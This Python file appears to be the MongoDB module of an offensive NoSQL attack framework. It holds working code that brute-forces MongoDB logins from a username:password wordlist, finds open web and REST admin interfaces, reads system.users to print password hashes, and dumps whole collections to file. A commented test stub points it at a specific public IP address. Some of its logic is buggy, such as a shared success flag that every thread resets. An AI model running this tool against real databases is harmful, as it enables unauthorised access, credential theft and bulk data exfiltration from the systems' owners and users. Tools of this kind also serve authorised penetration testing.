from __future__ import print_function
# Mongo Attack file
import threading
import pymongo
from pymongo import MongoClient
from termcolor import colored
from dbattacks.utils import screenshot
import requests


global passfound


def mongo_conn(target, port=27017, mass=False):
    """
    Establishes Connection with MongoDB and Determines whether alive or not and returns the connection object

    """
    try:
        # Moved to MongoClient since Connection is Deprecated
        conn = MongoClient(str(target), port)
        # db = conn['test']
        if mass and conn.database_names():  # Checks when mass scan of a IP List is provided
            print(colored("[+] MongoDB port open on " +
                          target + ":27017!\n", 'green'))
        elif conn.database_names():
            print(colored("[+] MongoDB port open on " +
                          target + ":27017!\n", 'green'))
            return conn
    except pymongo.errors.OperationFailure:
        if mass:
            print(colored("[+] MongoDB port open " +
                          target + ":27017 \n", 'green'))
        else:
            print(colored("[+] MongoDB port open " +
                          target + ":27017 \n", 'green'))
            return conn
            # sys.exit()
    except pymongo.errors.ConnectionFailure:
        if mass:
            print(colored("[+] MongoDB port closed " +
                          target + ":27017 \n", 'red'))
        else:
            print(colored("[-] MongoDB port closed. \n", 'red'))
            # sys.exit()


def dict_mongo(file_name, target, port=27017, db='admin'):
    """

    Used to For Dictionary Attack on MongoDB reads from Dictionary of format 'username:password'

    By default Dictionary attacks for admin DB

    Multithreaded the Module

    """

    t1 = ""
    print(colored(
        "[-] Dictionary Attack Module For NoSQL Framework Launched .. \n", 'blue'))
    conn = MongoClient(target, port)
    try:
        db = conn[db]  # Use admin by Default
        file = open(file_name, "r")
        lines = file.read().split('\n')
        for names in lines:
            # s1 = names
            t1 = threading.Thread(target=tryandgetpass, args=(db, names))
            t1.start()
        if passfound:
            print(colored(passfound, 'green'))
        else:
            print(
                colored("[-] Password Not found in the File Specified", 'red'))
    except Exception as e:
        print(colored(str(e), 'red'))

# Module to try mongo authentication


def tryandgetpass(db, names):

    global passfound
    passfound = ""
    try:
        if names:
            db.authenticate(names.split(':')[0], names.split(':')[1])
            # print colored("[+] Auth Succeeded with username:%s and Password
            # %s"%(names.split(':')[0],names.split(':')[1]),'green')
            passfound = "[+] Auth Succeeded with username:%s and Password %s" % (
                names.split(':')[0], names.split(':')[1])
        else:
            pass
    except pymongo.errors.OperationFailure:
        print(colored("[-] Auth Failed with username:%s and Password %s" %
                      (names.split(':')[0], names.split(':')[1]), 'red'))

# Checks for Mongo Web Interface


def mongo_web_interface(target, port=28017, creds=False, enableScreen=False):

    try:
        url = 'http://' + target + ':' + str(port)
        code = requests.get(url)
        if code.status_code == 200 and code.content.find('mongo') != -1 and code.content.find('db version') != -1:
            print(colored("\n[+] MongoDB web management open at " +
                          url + ".  No authentication required!", 'blue'))
            rest_url = url + '/buildInfo?text=1'
            testrest = requests.get(rest_url)
            if testrest.content.find('not enabled') != -1:
                print(colored("\n[-] REST Interface Not enabled", 'red'))
            else:
                print(
                    colored("\n[+] REST Interface Enabled URL: " + rest_url, 'green'))
                if enableScreen:
                    screenshot(url, creds)
        elif code.status_code == 401:
            print(colored("[-] MongoDB web management Open at " +
                          url + ".  Authentication required!", 'blue'))
            print(
                colored("[-] Try Supplying credentials using the Auth option", 'blue'))
            print(
                colored("[-] Do you Want to Take a ScreenShot of the Page (y/n)", 'yellow'))
            # choice = raw_input()
            if enableScreen:
                screenshot(url, creds)
            else:
                pass
        else:
            print(colored("[-] Web Interface Not Open", 'red'))
    except Exception as e:
        print(str(e))


def mongo_enum(conn, creds=False, authall=False, sel_db='admin', collection=False, dump=False, limit=0, file_write=False):
    """
    Mongo Enumeration phase. Determines version and Clients Connected.

    Dumps the Available Databases and collections

    Default Uses admin database to grab credentials

    """

    #temp_db = sel_db
    print(
        colored("[+] Enumeration Module For NoSQL Framework Launched .. \n", 'blue'))
    if authall:
        creds = authall
        sel_db = 'admin'
    if creds:
        db = conn[sel_db]
        try:
            db.authenticate(creds.split(':')[0], creds.split(':')[1])
            print(colored("[-] Retrying with Supplying Credentials", 'green'))
        except pymongo.errors.OperationFailure:
            print(
                colored("\t[-] Authentication Failed with Credentials " + creds, 'red'))
            fail = True
        print(sel_db)

    fail = False
    further = True
    nodoc = False
    done = False

    db = conn[sel_db]
    client = db.current_op('true')

    print(colored("[!] Server Info: \n", 'yellow'))
    serverInfo = conn.server_info()
    for keys in serverInfo:
        print(colored("\t[-]" + (keys) + ":" + str(serverInfo[keys]), 'green'))
    print("\n")

    print(colored("[+] Checking for the Command Line Arguments", 'green'))
    try:
        db = conn['admin']
        cmdargs = db.command('getCmdLineOpts')
        # print cmdargs
        for i in cmdargs:
            print(colored("\t[+] " + i + ":" + str(cmdargs.get(i)), 'green'))
        db = conn[sel_db]
    except Exception as e:
        print(colored("\t [-] Failed Exception : " + str(e), 'red'))

    if not client.get('err'):
        print(colored("[!] Clients Connected: ", 'yellow'))
        for i in client['inprog']:
            try:
                print(colored("\t[-]" + i['client'], 'green'))
            except KeyError as e:
                pass
        print("\n")

    else:
        print(colored("[!] Could not Fetch Clients Connected \n", 'yellow'))
        print(colored("\t[-] Unauthorized Supply Creds \n", 'red'))
    # Code inspired from NoSQLMAP(kudos to the developer and a sincere apology
    # for the late)
    try:
        print(colored("[!] List of databases:", 'blue'))
        dbList = conn.database_names()

        for i in dbList:
            print(colored("\t[+]" + i, 'green'))

    except Exception as e:
        print(colored("\t[-] Error Occured:" + str(e), 'red'))
        further = False

    try:

        if sel_db:
            db = conn[sel_db]
            colls = db.collection_names()
            if colls:
                print(colored("\t[-] " + sel_db + ":", 'magenta'))
            else:
                print(
                    colored("[-] admin DB does not have any Collections\n", 'yellow'))
            for i in colls:
                try:
                    print(colored("\t\t[-]" + i, 'green'))
                    if 'system.users' in colls:
                        users = list(db.system.users.find())
                        print(colored("\n[!] Found system.users for '" + sel_db +
                                      "' Checking for Users and Password Hashes:", 'yellow'))
                        print(colored("\n[+] Found '" + sel_db +
                                      "' Users and Password Hashes:", 'blue'))
                        print(colored("[-]" + str(users), 'green'))
                        print("\n")
                except Exception as e:
                    print(str(e))
                    print(
                        colored("[-] not authorized to query the system.users spaces", 'red'))
            done = True

        if dump:
            db = conn[sel_db]
            if collection in db.collection_names():
                coll = db[collection]
            else:
                print(colored('[-] Invalid Collection Name', 'red'))
            print(colored("\n[+] Dumping '" + sel_db +
                          "' DB & Collection '" + collection + "'", 'magenta'))

            if file_write:
                filej = open(file_write, "w")
            count = 0

            if coll.find().count() == 0:
                print(
                    colored("[-] No documents Found for" + collection, 'yellow'))
                nodoc = True
            if limit and not nodoc:
                for i in coll.find(limit=limit):
                    if file_write:
                        filej.write(str(i))
                        count = count + 1
                    else:
                        print(colored("\t[-] " + str(i), 'green'))
            elif not nodoc:
                for i in coll.find():
                    if file_write:
                        filej.write(str(i))
                        count = count + 1
                    else:
                        print(colored("\t[-] " + str(i), 'green'))
            if file_write:
                print(colored("[+] Written to file " +
                              str(count) + " Documents", 'green'))
                filej.close()
            further = False

    except Exception as e:
        print(colored("\t[-] Eror Occured:" + str(e), 'red'))
        further = False

    if further and not fail and not done:

        print(colored("[!] List of collections:", 'blue'))

        try:
            for dbItem in dbList:
                db = conn[dbItem]
                colls = db.collection_names()
                print(colored("\t[-] " + dbItem + ":", 'magenta'))
                for i in colls:
                    print(colored("\t\t[-]" + i, 'green'))
                if 'system.users' in colls:
                    users = list(db.system.users.find())
                    print(colored("\n[!] Found system.users for '" + dbItem +
                                  "' Checking for Users and Password Hashes:", 'yellow'))
                    print(colored("\n[+] Found '" + dbItem +
                                  "' Users and Password Hashes:", 'blue'))
                    print(colored("[-]" + str(users), 'green'))
                    print("\n")
        except pymongo.errors.AutoReconnect:
            print(
                colored("[!] Looks Like Slaveok is Set to False\n ", 'yellow'))
            print(colored("[!] Renabling with slaveok= true", 'green'))
            db.slave_okay = True
            for dbItem in dbList:
                db = conn[dbItem]
                db.slave_okay = True
                colls = db.collection_names()
                print(colored("\t[-] " + dbItem + ":", 'magenta'))
                if len(colls) == 0:
                    print(colored("[-] Empty", 'green'))
                else:

                    for i in colls:
                        print(colored("\t\t[-]" + i, 'green'))
                    if 'system.users' in colls:
                        users = list(db.system.users.find())
                        print(colored("\n[!] Found system.users for '" + dbItem +
                                      "' Checking for Users and Password Hashes:", 'yellow'))
                        print(colored("\n[+] Found '" + dbItem +
                                      "' Users and Password Hashes:", 'blue'))
                        print(colored("[-]" + str(users), 'green'))
                        print("\n")
        except:
            print(colored("\t[-] Authentication Required ", 'red'))

# Test Modules Here


"""
def main():
    conn = mongo_conn('54.185.222.150')
    # mongo_web_interface('localhost')
    # dict_mongo('./dictionary/b.txt','localhost')
    mongo_enum(conn)
main()

"""
